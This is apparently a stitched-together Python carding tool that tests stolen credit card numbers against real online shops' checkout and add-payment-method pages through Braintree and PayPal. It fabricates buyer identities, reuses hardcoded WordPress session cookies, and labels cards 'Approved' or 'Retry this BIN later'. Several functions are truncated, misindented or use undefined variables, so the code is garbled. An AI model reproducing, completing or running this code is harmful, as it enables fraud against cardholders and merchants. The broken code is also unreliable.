    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'tk_or=%22https%3A%2F%2Fwww.bing.com%2F%22; cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; tk_ai=lVnMcJOg2N0GnWKChpDqwINk; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; __utmz=142726050.1713365611.2.2.utmcsr=bing|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); tk_lr=%22%22; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-05-13%2021%3A53%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Ffirefly-fields.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-05-13%2021%3A53%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Ffirefly-fields.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Safari%2F537.36; __utma=142726050.181325669.1713184979.1715440202.1715637195.7; __utmc=142726050; __utmt=1; _gid=GA1.2.442064610.1715637196; wordpress_logged_in_8ac74b3414a98b6ff4fd6f539248fc0a=mska.wj-6980%7C1715810014%7C4flJsXlUxVJRhpENb6ZEmBN2mV4OAHOskUq5zzgROHu%7C32e934706ae18ce887d7fc12f1da3e729cd1628501aa5a6ed98a0bb3d8d15264; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffirefly-fields.com%2Fmy-account%2Fadd-payment-method%2F; __utmb=142726050.4.10.1715637195; tk_qs=; _ga_51HCC8HHHV=GS1.1.1715637195.7.1.1715637351.0.0.0; _ga=GA1.2.1448327166.1713184980; _gat_gtag_UA_128958617_1=1',
    'origin': 'https://firefly-fields.com',
    'referer': 'https://firefly-fields.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
}

	data = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'master-card'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', tok),
    ('wc_braintree_device_data', '{"correlation_id":"10d81a609b9013781e6c0cb08f54f835"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"10d81a609b9013781e6c0cb08f54f835"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'USD'),
    ('wc_braintree_paypal_locale', 'en_us'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', nonce),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]
	response = r.post(
	    'https://firefly-fields.com/my-account/add-payment-method/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	text=response.text
	html_text=response.text
	soup = BeautifulSoup(html_text, 'html.parser')
	if '<head><title>Not Acceptable!</title></head><body><h1>Not Acceptable!</h1><p>An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security.</p></body></html>' in response.text:
		return "RISK: Retry this BIN later."
	try:
		error_message = soup.find('div', class_='woocommerce-notices-wrapper').text.strip()
		status_code_start = error_message.find('Status code') + len('Status code')
		status_code_end = error_message.find('</div>')
		result = error_message[status_code_start:status_code_end]
		if 'avs' in result or 'Invalid postal code' in result or 'Insufficient Funds' in result:
			return 'Approved'
		elif 'Please wait for 20 seconds' in result:
			return "RISK: Retry this BIN later."
		else:
			return result
	except:
		result=text
	if 'Payment method successfully added.' in text:
		return "1000: Approved"
	else:
		for varp in varps:
			up(varp)
		return "RISK: Retry this BIN later." 
		
def pay(ccx, start_num):
	ccx = ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2][-2:]
	cvc = ccx.split("|")[3].replace('\n', '')

	card_type = 'Unknown'
	if n.startswith('4'):
		card_type = 'VISA'
	elif n.startswith('5'):
		card_type = 'MASTER_CARD'

	session = requests.Session()
	user = generate_user_agent()
	name1 = names.get_first_name()
	name2 = names.get_last_name()

	headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }

	data = {
            'action': 'astra_add_cart_single_product',
            'add-to-cart': '2465',
            'quantity': '1',
        }

	req1 = session.post('https://www.intimategadgets.com/wp-admin/admin-ajax.php', cookies=session.cookies, headers=headers, data=data)
	time.sleep(2)

	headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'user-agent': user,
        }

	req2 = session.get('https://www.intimategadgets.com/cart/', cookies=session.cookies, headers=headers)
	time.sleep(2)

	req3 = session.get('https://www.intimategadgets.com/checkout/', cookies=session.cookies, headers=headers)
	time.sleep(2)

	pp_create = re.search(r'wc-ajax=ppc-create-order","nonce":"(.*?)"}', req3.text).group(1)
	checkout = re.search(r'id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="(.*?)"', req3.text).group(1)
	save_checkout = re.search(r'wc-ajax=ppc-save-checkout-form","nonce":"(.*?)"}', req3.text).group(1)

	headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'user-agent': user,
        }

	params = {
            'wc-ajax': 'ppc-save-checkout-form',
        }

	json_data = {
            'nonce': save_checkout,
            'form_encoded': f'billing_email=steven59%40example.com&billing_password=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fwww.intimategadgets.com%2Fcart%2F&wc_order_attribution_session_start_time=2024-07-17+00%3A06%3A18&wc_order_attribution_session_pages=9&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36&billing_first_name={name1}&billing_last_name={name2}&billing_company=&billing_country=US&billing_address_1=16012+Frederick+Rd&billing_address_2=&billing_city=Woodbine&billing_state=MD&billing_postcode=21797&billing_phone=%28410%29+489-6560&order_comments=&ast-coupon-code=&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce=fa3648d899&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&shipping_method%5B0%5D=flat_rate%3A4&ppcp-funding-source=card',
        }

	req4 = session.post('https://www.intimategadgets.com/', params=params, cookies=session.cookies, headers=headers, json=json_data)
	time.sleep(2)

	headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'user-agent': user,
        }

	params = {
            'wc-ajax': 'ppc-create-order',
        }

	json_data = {
            'nonce': pp_create,
            'payer': None,
            'bn_code': 'Woo_PPCP',
            'context': 'checkout',
            'order_id': '0',
            'payment_method': 'ppcp-gateway',
            'funding_source': 'card',
            'form_encoded': f'billing_email=steven59%40example.com&billing_password=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fwww.intimategadgets.com%2Fcart%2F&wc_order_attribution_session_start_time=2024-07-17+00%3A06%3A18&wc_order_attribution_session_pages=9&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36&billing_first_name={name1}&billing_last_name={name2}&billing_company=&billing_country=US&billing_address_1=16012+Frederick+Rd&billing_address_2=&billing_city=Woodbine&billing_state=MD&billing_postcode=21797&billing_phone=%28410%29+489-6560&order_comments=&ast-coupon-code=&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce={checkout}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&shipping_method%5B0%5D=flat_rate%3A4&ppcp-funding-source=card',
            'createaccount': False,
            'save_payment_method': False,
        }

	req5 = session.post('https://www.intimategadgets.com/', params=params, cookies=session.cookies, headers=headers, json=json_data).json()
	time.sleep(2)

	id = req5['data']['id']

	headers = {
            'accept': '*/*',
            'accept-language': 'es-419,es;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'paypal-client-context': id,
            'paypal-client-metadata-id': id,
            'priority': 'u=1, i',
            'referer': f'https://www.paypal.com/smart/card-fields?sessionID=uid_0a0720417b_mda6mdy6mtg&buttonSessionID=uid_0e7d9525fe_mda6mtg6ndm&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWJ0eUtqTk53NjNGcHBQWklwbHFreWk2TkpOdFA5VzQzNVhzaF95MEYwWUdZS3I2SDF1dHZvTVVCVjZzUl90RUVHcjUyMTMwRmo4SW05Y3ImY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNCOwNi0wMyZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSxidXR0b25zJnZhdWx0PWZhbHNlJmNvbW1pdD10cnVlJmludGVudD1jYXB0dXJlJmVuYWJsZS1mdW5kaW5nPXZlbm1vLHBheWxhdGVyIiwiYXR0cnMiOnsiZGF0YS1wYXJ0bmVyLWF0dHJpYnV0aW9uLWlkIjoiV29vX1BQQ1AiLCJkYXRhLXVpZCI6InVpZF9sY2drZ2lzYWNocG9tc2lja3d1d2l0ZnB6Y3N2bHkifX0&disable-card=&token={id}',
            'user-agent': user,
            'x-app-name': 'standardcardfields',
            'x-country': 'US',
        }

	json_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': id,
                'card': {
                    'cardNumber': n,
                    'type': card_type,
                    'expirationDate': f'{mm}/20{yy}',
                    'postalCode': '21797',
                    'securityCode': cvc,
                },
                'firstName': name1,
                'lastName': name2,
                'billingAddress': {
                    'givenName': name1,
                    'familyName': name2,
                    'line1': '16012 Frederick Rd',
                    'line2': None,
                    'city': 'Woodbine',
                    'state': 'MD',
                    'postalCode': '21797',
                    'country': 'US',
                },
                'email': f'st{name1.lower()}n59@example.com',
                'currencyConversionType': 'PAYPAL',
            },
            'operationName': None,
        }

	req6 = session.post(
            'https://www.paypal.com/graphql?fetch_credit_form_submit',
	cookies=session.cookies,
	headers=headers,
	json=json_data,
	)
	msg = req6.text

    

			
			
from user_agent import generate_user_agent
def st(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	user = generate_user_agent()
	if "20" in yy:#MEDO
		yy = yy.split("20")[1]

	headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'user-agent': user,
    }

	req = session.get('https://www.ywampublishing.com/p-1649-prison-donation-project.aspx', cookies=session.cookies, headers=headers)
	time.sleep(2)
	headers = {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
    }

	data = {
        'ProductId': '1649',
        'VariantId': '1681',
        'CartRecordId': '0',
        'UpsellProducts': '',
        'ReturnUrl': '/p-1649-prison-donation-project.aspx',
        'IsWishlist': 'false',
        'TextOption': email,
        'CustomerEnteredPrice': '0.01',
    }

	req1 = session.post('https://www.ywampublishing.com/minicart/ajaxaddtocart', cookies=session.cookies, headers=headers, data=data)
	time.sleep(2)
	headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': user,
    }

	params = {
        'cartType': 'ShoppingCart',
    }

	data = {
        'CartItems[0].Id': '556169',
        'CartItems[0].ProductId': '1649',
        'CartItems[0].VariantId': '1681',
        'CartItems[0].ChosenColorSkuModifier': '',
        'CartItems[0].ChosenSizeSkuModifier': '',
        'CartItems[0].TextOption': email,
        'CartItems[0].Quantity': '1',
        'returnUrl': '/p-1649-prison-donation-project.aspx',
    }

	req2 = session.post(
        'https://www.ywampublishing.com/minicart/updateminicart',
        params=params,
        cookies=session.cookies,
        headers=headers,
        data=data,
    )
	time.sleep(2)
	headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': user,
    }

	data = {
        'Email': email,
    }

	req3 = session.post('https://www.ywampublishing.com/checkoutaccount/setemail', cookies=session.cookies, headers=headers, data=data)
	time.sleep(2)
	tokenpayment = re.search(r'name="__RequestVerificationToken" type="hidden" value="(.*?)"', req3.text).group(1)

	headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': user,
    }

	params = {
        'makePrimary': 'True',
        'addressType': 'Billing',
        'returnurl': '/shoppingcart.aspx',
    }

	data = {
        'Address.Id': '',
        'MakePrimary': 'True',
        'Address.Country': 'United States',
        'Address.Name': name1,
        'Address.Phone': '(863) 983-8465',
        'Address.Address1': '532 E Obispo Ave',
        'Address.Address2': '',
        'Address.Suite': '',
        'Address.Company': '',
        'Address.Zip': '33440',
        'Address.City': 'Clewiston',
        'Address.State': 'FL',
    }

	req4 = session.post('https://www.ywampublishing.com/address/detail', params=params, cookies=session.cookies, headers=headers, data=data)
	time.sleep(2)
	headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': user,
    }

	data = {
        'Name': name1,
        'Number': cc,
        'CardType': card_type,
        'ExpirationDate': f'{mm} / {yy}',
        'Cvv': cvc,
        'SaveCreditCardNumber': [
            'true',
            'false',
        ],
    }

	req5 = session.post(
        'https://www.ywampublishing.com/checkoutcreditcard/creditcard',
        cookies=session.cookies,
        headers=headers,
        data=data,
    )
	time.sleep(2)
	headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': user,
    }

	data = {
        '__RequestVerificationToken': tokenpayment,
        'OrderNotes': '',
        'OkToEmailSelected': 'false',
    }

	req6 = session.post('https://www.ywampublishing.com/checkout/placeorder', cookies=session.cookies, headers=headers, data=data)
	time.sleep(14)
	msg = req6.text

	result = re.findall(r'<div class="notice notice-failure">\s*(.*?)\s*</div>', msg)[0]

	init()

	print(f"[{Fore.WHITE}{start_num}{Style.RESET_ALL}] "
        f"{Fore.WHITE}{P}{Style.RESET_ALL} >> "
        f"{Fore.RED}{result}{Style.RESET_ALL} "
        f"{Fore.GREEN}@Moha_Azouz{Style.RESET_ALL}")





from user_agent import generate_user_agent
def vbv(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm= ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	user = generate_user_agent()

	import random, string

	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
	corr = generate_random_code()

	def generate_full_name():
		first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
	                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
	                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
	                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
	                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
	                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
	                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
	                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
	                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
	                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] 
	    
		last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
	                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
	                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
	                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
	                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
	                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
	                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
	                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] 
	                   
		full_name = random.choice(first_names) + " " + random.choice(last_names)
		first_name, last_name = full_name.split()
        
		return first_name, last_name
    
	def generate_address():
		cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
	states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
	streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
	zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
	
	city = random.choice(cities)
	state = states[cities.index(city)]
	street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
	zip_code = zip_codes[states.index(state)]
	return city, state, street_address, zip_code
	
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
	def num():
		number = ''.join(random.choices(string.digits, k=7))
	return f"303{number}"
	num = (num())



	cookies = {
    'wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee': 'zjdkdidhsjndj%7C1722392839%7C444jS0mi0EaT13V8TdsFM97iMIRz1wkjpRMbTkZOQoa%7Cfd75c26b036d310328e93d0d455027b46682a740d4c4853f63562e810a8b14be',
    }

	headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

	response = r.get('https://www.yazoomills.com/my-account/edit-address/billing/', cookies=cookies, headers=headers)

	nonce_adrees = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)

	cookies = {
    'wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee': 'zjdkdidhsjndj%7C1722392839%7C444jS0mi0EaT13V8TdsFM97iMIRz1wkjpRMbTkZOQoa%7Cfd75c26b036d310328e93d0d455027b46682a740d4c4853f63562e810a8b14be',
    }

	headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'priority': 'u=0, i',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

	data = {
        'billing_first_name': first_name,
        'billing_last_name': last_name,
        'billing_company': '',
        'billing_country': 'US',
        'billing_address_1': street_address,
        'billing_address_2': '',
        'billing_city': city,
        'billing_state': state,
        'billing_postcode': zip_code,
        'billing_phone': num,
        'billing_email': 'dsdsdjsidskdsmkk@gmail.com',
        'save_address': 'Save address',
        'woocommerce-edit-address-nonce': nonce_adrees,
        '_wp_http_referer': '/my-account/edit-address/billing/',
        'action': 'edit_address',
    }

	response = r.post(
        'https://www.yazoomills.com/my-account/edit-address/billing/',
        cookies=cookies,
        headers=headers,
        data=data,
    )

	cookies = {
    'wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee': 'zjdkdidhsjndj%7C1722392839%7C444jS0mi0EaT13V8TdsFM97iMIRz1wkjpRMbTkZOQoa%7Cfd75c26b036d310328e93d0d455027b46682a740d4c4853f63562e810a8b14be',
    }

	headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

	response = r.get('https://www.yazoomills.com/my-account/payment-methods/', cookies=cookies, headers=headers)


	cookies = {
    'wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee': 'zjdkdidhsjndj%7C1722392839%7C444jS0mi0EaT13V8TdsFM97iMIRz1wkjpRMbTkZOQoa%7Cfd75c26b036d310328e93d0d455027b46682a740d4c4853f63562e810a8b14be',
    }

	headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

	response = r.get('https://www.yazoomills.com/my-account/add-payment-method/', cookies=cookies, headers=headers)

	nonce_add = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	ey = re.search(r'"client_token_nonce":"(.*?)"', response.text).group(1)

	cookies = {
    'wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee': 'zjdkdidhsjndj%7C1722392839%7C444jS0mi0EaT13V8TdsFM97iMIRz1wkjpRMbTkZOQoa%7Cfd75c26b036d310328e93d0d455027b46682a740d4c4853f63562e810a8b14be',
    }

	headers = {
        'accept': '*/*',
        'accept-language': 'es-419,es;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'wordpress_sec_29d4bb5994f0ca859e9db957c5c93aee=dsdsdjsidskdsmkk%7C1716947459%7CG2YGNQupn2ew2CvypQbuDUL8A31qBPK3zWJThNKky5Y%7C21c2d20d902ea90c67438ccff5e699e4864bab1cfbce2bce44252ac479529baf; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-05-15%2001%3A24%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2F; sbjs_first_add=fd%3D2024-05-15%2001%3A24%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Safari%2F537.36; _gcl_au=1.1.1308884592.1715736249; __utmzz=utmccn=(not set); __utmzzses=1; _gid=GA1.2.472931171.1715736249; _clck=u1cyn3%7C2%7Cfls%7C0%7C1596; brandcdn_uid=2687bd80-05ab-4d90-bc24-6a424f66d46a; pum-61408=true; wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee=dsdsdjsidskdsmkk%7C1716947459%7CG2YGNQupn2ew2CvypQbuDUL8A31qBPK3zWJThNKky5Y%7C603fbec366fdf362a89b8ca90456a60eafa14372a4969943e68bfadfde5e543d; wp_automatewoo_visitor_29d4bb5994f0ca859e9db957c5c93aee=xuuow97mf1866tndcoo3; wp_automatewoo_session_started=1; wfwaf-authcookie-353b44fd2d0fa5951e3540788f9b2103=5346%7Cother%7Cread%7C84b56073d03719c9378923d1da890079270f4596292370d3b90836eb8568f207; tk_ai=fRPx8Zix6PmNn5iWbeQroBR9; _uetsid=d3d516c0125911efa17d3392677a3a49; _uetvid=d3d524d0125911efa5f5f9e7a0b14802; tk_qs=; _clsk=1rbue3w%7C1715738080317%7C9%7C1%7Ct.clarity.ms%2Fcollect; sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fadd-payment-method%2F; _ga_JT1Y3HZ65M=GS1.1.1715736095.1.1.1715738154.0.0.0; _ga=GA1.2.581825820.1715736096; _gat_UA-2829389-2=1; _gat_UA-2829389-1=1',
        'origin': 'https://www.yazoomills.com',
        'priority': 'u=1, i',
        'referer': 'https://www.yazoomills.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
